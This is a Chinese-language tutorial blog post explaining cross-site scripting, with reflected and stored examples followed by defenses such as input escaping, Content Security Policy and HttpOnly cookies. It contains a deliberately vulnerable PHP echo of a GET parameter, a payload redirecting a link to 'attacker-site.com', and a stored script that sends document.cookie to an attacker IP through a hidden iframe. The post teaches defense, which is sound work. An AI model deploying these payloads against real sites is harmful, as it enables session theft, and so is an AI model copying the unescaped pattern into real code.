# XSS 跨站脚本攻击


---

随着互联网技术的发展，现在的Web应用都含有大量的动态内容以提高用户体验。所谓动态内容，就是应用程序能够根据用户环境和用户请求，输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting, 安全专家们通常将其缩写成 XSS）的威胁，而静态站点则完全不受其影响。

##什么是 XSS
XSS 是一种常见的 web 安全漏洞，它允许攻击者将恶意代码植入到提供给其它用户使用的页面中。不同于大多数攻击(一般只涉及攻击者和受害者)，XSS 涉及到三方，即攻击者、客户端与Web应用。XSS 的攻击目标是为了盗取存储在客户端的 cookie 或者其他网站用于识别客户端身份的敏感信息。一旦获取到合法用户的信息后，攻击者甚至可以假冒合法用户与网站进行交互。

**总之，XSS 能做用户使用浏览器能做的一切事情。包括获取用户的 cookie 等重要隐私信息的操作。另外，同源策略无法保证不受 XSS 攻击，因为此时攻击者就在同源之内**

##XSS 工作原理
XSS通常可以分为两大类：

- 客户端型
- 服务端型

无论是哪一种 XSS，其目前主要的手段和目的如下：

- 盗用cookie，获取敏感信息。
- 利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。
- 利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击者）- 用户的身份执行一些管理动作，或执行一些如:发微博、加好友、发私信等常规操作，前段时间新浪微博就遭遇过一次XSS。
- 利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。
- 在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果

###客户端型 xss 攻击

客户端型 xss 攻击是一次性的，仅对当次的页面访问产生影响。客户端型 xss 攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。

假设有以下index.php页面：
```
<?php
$name = $_GET['name'];
echo "Welcome $name<br>";
echo "<a href="http://www.cnblogs.com/bangerlee/">Click to Download</a>";
?>
```
该页面显示两行信息：

从URI获取 'name' 参数，并在页面显示
显示跳转到一条URL的链接
这时，当攻击者给出以下URL链接：
```
index.php?name=guest<script>alert('attacked')</script>
```
当用户点击该链接时，将产生以下html代码，带'attacked'的告警提示框弹出：
```
Welcome guest
<script>alert('attacked')</script>
<br>
<a href='http://www.cnblogs.com/bangerlee/'>Click to Download</a>
```

除了插入alert代码，攻击者还可以通过以下URL实现修改链接的目的：

```
index.php?name=
<script>
window.onload = function() {
var link=document.getElementsByTagName("a");link[0].href="http://attacker-site.com/";}
</script>
```
当用户点击以上攻击者提供的URL时，index.php页面被植入脚本，页面源码如下：
```
<script>
window.onload = function() {
var link=document.getElementsByTagName("a");link[0].href="http://attacker-site.com/";}
</script>
<br>
<a href='http://www.cnblogs.com/bangerlee/'>Click to Download</a>
```
用户再点击 "Click to Download" 时，将跳转至攻击者提供的链接。

##服务端型 XSS 攻击
服务端型的 XSS 攻击与客户端型的运行原理类似。 其本质上是注入攻击。区别在于服务端型的恶意代码可以复用，并且不需要引诱用户点击某个连接。

还记得之前浏览器同源策略的知识吗？
浏览器的同源策略虽然对 ajax 请求做了限制，现代浏览器对于某些 xss 而已代码也做了过滤。但是，对于服务端返回的嵌入式资源的跨域交互是允许的！

黑客将将恶意代码通过某个操作，写入被攻击服务器的数据库中，接着在某个数据列表展示页面中通过嵌入 js 代码，迫使用户的浏览器执行恶意 javascript 代码来达到 XSS 攻击的目的。
就像下面这样：
```
// 用 <script type="text/javascript"></script> 包起来放在评论中

(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);

```
##如何避免 XSS 攻击
- 对于任何用户输入的信息，入库之前都要进行转义。
- 使用浏览器自带的 xss filter
现代浏览器都对反射型xss有一定的防御力，其原理是检查url和dom中元素的相关性。但这并不能完全防止反射型xss。另外，浏览器对于存储型xss并没有抵抗力，原因很简单，用户的需求是多种多样的。所以，抵御xss这件事情不能指望浏览器。
- CSP(Content Security Policy)
从原理上说防止xss是很简单的一件事，但实际中，业务代码非常多样和复杂，漏洞还是是不是会出现。 CSP 并不是用来防止xss攻击的，而是最小化xss发生后所造成的伤害。事实上，除了开发者自己做好xss转义，并没有别的方法可以防止xss的发生。CSP可以说是html5给web安全带来的最实惠的东西。。CSP的作用是限制一个页面的行为不论是否是javacript控制的。如何引入CSP呢？

假设现在需要完成一个只允许脚本从本源加载资源的设置，则有两种方式。

*通过response头*
```Content-Security-Policy: script-src ‘self’```
*通过HTML的META标签*
```<meta http-equiv=”Content-Security-Policy” content=”script-src ‘self'”>```
*CSP 策略常用限制功能*
```
base-uri : 限制这篇文档的uri  
child-src ：限制子窗口的源(iframe,弹窗等),取代frame-src  
connect-src ：限制脚本可以访问的源  
font-src : 限制字体的源  
form-action : 限制表单能够提交到的源  
frame-ancestors : 限制了当前页面可以被哪些页面以iframe,frame,object等方式加载  
frame-src ：deprecated with child-src,限制了当前页面可以加载哪些源，与frame-ancestors对应 
img-src : 限制图片可以从哪些源加载  
media-src : 限制video, audio, source, track 能够从哪些源加载  
object-src ：限制插件可以从哪些源加载  
sandbox ：强制打开沙盒模式

```

CSP是一个强大的策略，几乎可以限制了所有能够用到的资源的来源。使用好CSP可以很大成都降低XSS带来的风险
CSP 目前有两版，CSP1 和CSP2， 两版的支持状态可以在 http://caniuse.com/#search=csp 中查到。

- Http-Only
使用 http-only 保护cookie。可以保证即使发生了xss，用户的cookie也是安全的。使用http-only 保护的cookie是不会被 javascript 读写的。所以无论是客户端还是服务端的 XSS 攻击，都无法通过 js 获取到用户的 cookie 信息。


##总结
XSS 与 CSRF 攻击都是属于高危攻击手段。即使是在现代浏览器、同源策略以及 html5 的强大防线下，他们依然能够对 web 应用产生巨大的危害。
在开发 web 应用时，应该合理利用 http-only、CSP 策略、以及用户输入信息转义，能够将 XSS 与 CSRF 的风险降到最低。

---

Copyright 2017/08/15 by Chuck Lin

#####参考链接
- [避免 SQL 注入](https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md), by wuyuanwei
- [Web 攻击与防护](http://liuwanlin.info/webgong-ji-yu-fang-hu/), by liuwulin
- [浏览器的同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)
- [总结 XSS 与 CSRF 两种跨站攻击](https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/)
- [XSS 攻击入门](http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html)
- [关于Web安全，99%的网站都忽略了这些](https://blog.wilddog.com/?p=290), by wilddog
- [预防跨站点请求伪造：了解浏览器选项卡中的隐藏危险](https://www.ibm.com/developerworks/cn/web/se-appscan-detect-csrf-xsrf/)
- [CSRF 攻击的应对之道](http://www.importnew.com/5839.html)

若文章有幸帮到了您，您可以捐助我，以鼓励我写出更棒的作品！

![alipay.jpg-17.7kB][1]![wechat.jpg-16.7kB][2]


[1]: http://static.zybuluo.com/mikumikulch/6g65s5tsspdmsk87a8ariszo/alipay.jpg
[2]: http://static.zybuluo.com/mikumikulch/rk5hldgo4wi9fv23xu3vm8pf/wechat.jpg



